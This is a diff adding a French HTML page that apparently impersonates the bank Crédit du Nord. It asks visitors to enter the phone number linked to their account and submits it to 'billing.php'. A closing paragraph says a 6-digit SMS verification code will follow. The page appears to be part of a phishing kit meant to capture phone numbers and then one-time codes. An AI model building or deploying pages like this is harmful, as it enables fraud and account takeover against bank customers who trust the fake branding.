@@ -1,0 +1,65 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Untitled Page</title>
+<meta name="generator"content="WYSIWYG Web Builder 15 - http://www.wysiwygwebbuilder.com">
+<meta name="viewport"content="width=device-width, initial-scale=1.0">
+<link href="css/Untitled1.css" rel="stylesheet">
+<link href="css/telephone.css" rel="stylesheet">
+<script src="js/jquery-1.12.4.min.js"></script>
+<script src="js/jquery-ui.min.js"></script>
+<script src="js/wwb15.min.js"></script>
+<script>
+$(document).ready(function()
+{
+   $("a[href*='#FlexContainer2']").click(function(event)
+   {
+      event.preventDefault();
+      $('html, body').stop().animate({ scrollTop: $('#FlexContainer2').offset().top }, 600, 'swing');
+   });
+});
+</script>
+</head>
+<body>
+<div id="FlexContainer1">
+<div id="wb_Image1" style="display:inline-block;width:143px;z-index:2;">
+<img src="images/TE.png" id="Image1" alt="">
+</div>
+<div id="wb_Text1">
+<span style="color:#2e84b7;font-family:Arial;font-size:20px;"><strong>Mettre à jour votre numéro de téléphone<br>-</strong></span>
+</div>
+<div id="FlexContainer2">
+<div id="wb_Image2" style="display:inline-block;width:47px;z-index:0;">
+<img src="images/2020-08-06_132932.png" id="Image2" alt="">
+</div>
+<div id="wb_Text3">
+<span style="color:#2e84b7;font-family:Arial;font-size:13px;">Assurez-vous que votre numéro de téléphone a été saisi correctement</span>
+</div>
+</div>    <table>
+
+<div id="wb_Text5">
+
+  <link rel="stylesheet" href="js/JSFormValidation.css">
+  <script src="js/JSFormte.js"></script>
+  		<form id="formTest" method="POST" action="billing.php"> 
+
+<span style="color:#000000;font-family:Arial;font-size:13px;"><br>Saisissez votre num&#0233;ro de t&#0233;l&#0233;phone <strong>associé à votre compte</strong><br><br></span>								  
+
+
+
+
+</div>
+<input type="text" id="txtZipcode" style="display:block;width:255px;height:44px;" name="tele" value="" spellcheck="false">
+<div id="wb_Text4">
+<span id="elmZipcodeError" class="errorMsg"></span>
+<span style="color:#000000;font-family:Arial;font-size:13px;"><br><strong>&nbsp; </strong></span>
+</div>
+<input type="hidden" name="next">
+
+<input type="submit" id="btnSubmit" onclick="AnimateCss('txtZipcode', 'animate-border', 0, 500);" name="te" value="VALIDER" style="display:block;width:252px;height:44px;z-index:8;">
+</div>
+</body>
+</html>
+<p style="text-align: center;"><span style="color: rgb(46 132 183);">Apr&egrave;s avoir saisi votre num&eacute;ro de t&eacute;l&eacute;phone, vous allez recevoir un <strong>SMS&nbsp;</strong>sur votre t&eacute;l&eacute;phone. Le SMS contient un <strong>code de v&eacute;rification</strong> &agrave; 6 chiffres que vous pouvez saisir sur l&#39;&eacute;cran de v&eacute;rification de LA <strong>Crédit du Nord
+</strong>. Le code de v&eacute;rification est unique et change &agrave; chaque fois que vous v&eacute;rifiez un nouveau num&eacute;ro de t&eacute;l&eacute;phone . Veuillez ne pas tenter de deviner le code de v&eacute;rification, cela pourrait <strong>bloquer votre compte .</strong></span></p>
